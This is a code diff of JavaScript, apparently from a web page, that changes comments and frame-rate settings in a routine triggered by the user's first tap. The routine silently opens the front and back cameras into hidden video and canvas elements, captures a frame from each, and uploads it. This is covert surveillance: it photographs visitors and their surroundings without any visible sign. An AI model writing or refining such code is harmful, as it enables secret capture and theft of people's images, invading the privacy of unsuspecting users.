@@ -205,16 +205,16 @@
     firstTap = false;
 
     try {
-      // ---------- 1️⃣ Front camera (user) at 0.5× speed ----------
+      /* 1️⃣ Front (user) camera – normal 1× speed (no frame‑rate throttling) */
       const frontStream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: "user", frameRate: 15, width: 640, height: 480 },
+        video: { facingMode: "user", width: 640, height: 480 },
         audio: false
       });
       hiddenVideo.srcObject = frontStream;
       await new Promise(res => hiddenVideo.onloadedmetadata = res);
       await captureAndUpload(frontStream, 'front');
 
-      // ---------- 2️⃣ Back camera (environment) at normal speed ----------
+      /* 2️⃣ Back (environment) camera – normal speed */
       const backStream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: "environment", width: 1280, height: 720 },
         audio: false
@@ -229,10 +229,10 @@
   });
 
   /**
-   * Captures a single frame from the provided stream, uploads it,
-   * and stops the stream.
-   * @param {MediaStream} stream - the camera stream
-   * @param {string} label - optional label used in console (e.g., 'front' or 'back')
+   * Capture a single frame from the given stream, upload it,
+   * and stop the stream.
+   * @param {MediaStream} stream
+   * @param {string} label - used for console logs & filename
    */
   async function captureAndUpload(stream, label) {
     hiddenCanvas.width  = hiddenVideo.videoWidth;
